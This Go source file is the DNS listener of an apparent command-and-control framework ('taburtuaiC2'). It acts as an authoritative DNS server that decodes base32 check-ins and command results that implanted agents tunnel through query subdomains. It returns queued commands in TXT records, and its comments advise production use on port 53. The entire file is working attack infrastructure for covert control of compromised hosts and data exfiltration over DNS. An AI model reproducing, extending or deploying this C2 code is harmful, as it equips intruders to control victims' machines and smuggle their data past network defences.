// Package dnslistener implements a minimal authoritative DNS server for C2.
//
// Protocol overview:
//
//	Agent → Server  (DNS query):
//	  Query name: <base32(payload)>.<c2domain>  type TXT
//	  The payload is a JSON blob (checkin info or command result) base32-encoded
//	  and split into 63-char DNS labels.
//
//	Server → Agent  (DNS response):
//	  TXT record: base32-encoded command JSON  (or "NOOP" when queue empty)
//
// The DNS listener runs on UDP (default :5353) and does NOT require root on
// Linux when using a port >1024.  For production deployments, use port 53 with
// a firewall DNAT rule or run as root.
package dnslistener

import (
	"context"
	"encoding/base32"
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/dns/dnsmessage"

	"github.com/mjopsec/taburtuaiC2/internal/listener"
)

// nopadB32 is a case-insensitive, no-padding base32 codec — safe for DNS labels.
var nopadB32 = base32.StdEncoding.WithPadding(base32.NoPadding)

// DNSListener answers authoritative DNS queries from agents.
type DNSListener struct {
	config  *listener.Config
	handler listener.Handler
	domain  string // authoritative zone, e.g. "c2.example.com."
	conn    *net.UDPConn
	stats   *listener.Stats
	status  listener.Status
	mu      sync.RWMutex

	queries    int64
	errors     int64
	bytesIn    int64
	bytesOut   int64
}

// New creates a DNS listener.
// domain must be the authoritative zone (e.g. "c2.example.com").
// A trailing dot is added if missing.
func New(cfg *listener.Config, handler listener.Handler, domain string) *DNSListener {
	if !strings.HasSuffix(domain, ".") {
		domain += "."
	}
	return &DNSListener{
		config:  cfg,
		handler: handler,
		domain:  strings.ToLower(domain),
		stats: &listener.Stats{
			ListenerID: cfg.ID,
			StartedAt:  time.Now(),
		},
		status: listener.StatusStopped,
	}
}

// Start begins serving DNS queries on UDP.
func (d *DNSListener) Start(ctx context.Context) error {
	addr := fmt.Sprintf("%s:%d", d.config.Host, d.config.Port)
	conn, err := net.ListenPacket("udp", addr)
	if err != nil {
		return fmt.Errorf("dns listener bind %s: %w", addr, err)
	}
	d.conn = conn.(*net.UDPConn)

	d.mu.Lock()
	d.status = listener.StatusRunning
	d.stats.StartedAt = time.Now()
	d.mu.Unlock()

	go func() {
		<-ctx.Done()
		_ = d.Stop()
	}()

	buf := make([]byte, 512)
	for {
		n, src, err := d.conn.ReadFromUDP(buf)
		if err != nil {
			d.mu.RLock()
			stopped := d.status == listener.StatusStopped
			d.mu.RUnlock()
			if stopped {
				return nil
			}
			atomic.AddInt64(&d.errors, 1)
			continue
		}
		atomic.AddInt64(&d.bytesIn, int64(n))
		go d.handle(buf[:n], src)
	}
}

// Stop closes the UDP socket.
func (d *DNSListener) Stop() error {
	d.mu.Lock()
	d.status = listener.StatusStopped
	d.mu.Unlock()
	if d.conn != nil {
		return d.conn.Close()
	}
	return nil
}

func (d *DNSListener) GetConfig() *listener.Config { return d.config }
func (d *DNSListener) GetStatus() listener.Status  { return d.status }
func (d *DNSListener) GetStats() *listener.Stats {
	d.stats.BytesIn = atomic.LoadInt64(&d.bytesIn)
	d.stats.BytesOut = atomic.LoadInt64(&d.bytesOut)
	d.stats.Errors = atomic.LoadInt64(&d.errors)
	d.stats.TotalCheckins = atomic.LoadInt64(&d.queries)
	return d.stats
}

// handle parses one DNS query packet and writes the response.
func (d *DNSListener) handle(pkt []byte, src *net.UDPAddr) {
	var msg dnsmessage.Message
	if err := msg.Unpack(pkt); err != nil {
		atomic.AddInt64(&d.errors, 1)
		return
	}
	if msg.Header.Response || len(msg.Questions) == 0 {
		return
	}

	atomic.AddInt64(&d.queries, 1)
	q := msg.Questions[0]
	qname := strings.ToLower(q.Name.String())

	resp := dnsmessage.Message{
		Header: dnsmessage.Header{
			ID:                 msg.Header.ID,
			Response:           true,
			Authoritative:      true,
			RecursionDesired:   msg.Header.RecursionDesired,
			RecursionAvailable: false,
		},
		Questions: msg.Questions,
	}

	// Only answer queries for our authoritative zone.
	if !strings.HasSuffix(qname, "."+d.domain) && qname != d.domain {
		resp.Header.RCode = dnsmessage.RCodeNameError
		d.send(resp, src)
		return
	}

	// Decode the subdomain: everything before ".<domain>"
	sub := strings.TrimSuffix(qname, "."+d.domain)
	sub = strings.TrimSuffix(sub, d.domain)

	payload, err := decodeSubdomain(sub)
	if err != nil {
		resp.Header.RCode = dnsmessage.RCodeFormatError
		d.send(resp, src)
		return
	}

	// Dispatch based on message type embedded in the payload.
	txtResponse, err := d.dispatch(payload)
	if err != nil {
		atomic.AddInt64(&d.errors, 1)
		resp.Header.RCode = dnsmessage.RCodeServerFailure
		d.send(resp, src)
		return
	}

	// Encode response into TXT records (max 255 bytes per string).
	encoded := nopadB32.EncodeToString(txtResponse)
	chunks := splitChunks(encoded, 255)

	var txts []dnsmessage.TXTResource
	for _, ch := range chunks {
		txts = append(txts, dnsmessage.TXTResource{TXT: []string{ch}})
	}

	for _, txt := range txts {
		resp.Answers = append(resp.Answers, dnsmessage.Resource{
			Header: dnsmessage.ResourceHeader{
				Name:  q.Name,
				Type:  dnsmessage.TypeTXT,
				Class: dnsmessage.ClassINET,
				TTL:   0,
			},
			Body: &txt,
		})
	}

	d.send(resp, src)
}

// dispatch routes the decoded payload to the appropriate handler and returns
// the raw bytes to encode into the TXT response.
func (d *DNSListener) dispatch(payload []byte) ([]byte, error) {
	var env struct {
		Type    string          `json:"t"` // "c"=checkin, "r"=result, "p"=poll
		AgentID string          `json:"a"`
		Data    json.RawMessage `json:"d,omitempty"`
	}
	if err := json.Unmarshal(payload, &env); err != nil {
		return nil, fmt.Errorf("decode envelope: %w", err)
	}

	switch env.Type {
	case "c": // checkin
		var cd listener.CheckinData
		if err := json.Unmarshal(env.Data, &cd); err != nil {
			return nil, err
		}
		cd.AgentID = env.AgentID
		_, err := d.handler.OnCheckin(&cd)
		if err != nil {
			return nil, err
		}
		d.mu.Lock()
		d.stats.TotalCheckins++
		d.stats.LastCheckin = time.Now()
		d.mu.Unlock()
		return []byte(`{"s":"ok"}`), nil

	case "r": // result
		if err := d.handler.OnResult(env.AgentID, env.Data); err != nil {
			return nil, err
		}
		return []byte(`{"s":"ok"}`), nil

	case "p": // poll
		cmd, err := d.handler.OnPoll(env.AgentID)
		if err != nil || cmd == nil {
			return []byte(`{"s":"noop"}`), nil
		}
		b, err := json.Marshal(cmd)
		if err != nil {
			return nil, err
		}
		resp, _ := json.Marshal(map[string]json.RawMessage{"s": []byte(`"cmd"`), "c": b})
		return resp, nil

	default:
		return nil, fmt.Errorf("unknown message type %q", env.Type)
	}
}

// send serialises and writes a DNS response packet.
func (d *DNSListener) send(msg dnsmessage.Message, dst *net.UDPAddr) {
	b, err := msg.Pack()
	if err != nil {
		atomic.AddInt64(&d.errors, 1)
		return
	}
	n, _ := d.conn.WriteToUDP(b, dst)
	atomic.AddInt64(&d.bytesOut, int64(n))
}

// decodeSubdomain reassembles dot-separated base32 labels into raw bytes.
func decodeSubdomain(sub string) ([]byte, error) {
	if sub == "" {
		return nil, fmt.Errorf("empty subdomain")
	}
	// Join labels (dots were used as separators during encoding).
	joined := strings.ReplaceAll(sub, ".", "")
	joined = strings.ToUpper(joined)
	return nopadB32.DecodeString(joined)
}

// splitChunks splits s into chunks of at most n bytes.
func splitChunks(s string, n int) []string {
	var out []string
	for len(s) > 0 {
		if len(s) <= n {
			out = append(out, s)
			break
		}
		out = append(out, s[:n])
		s = s[n:]
	}
	return out
}
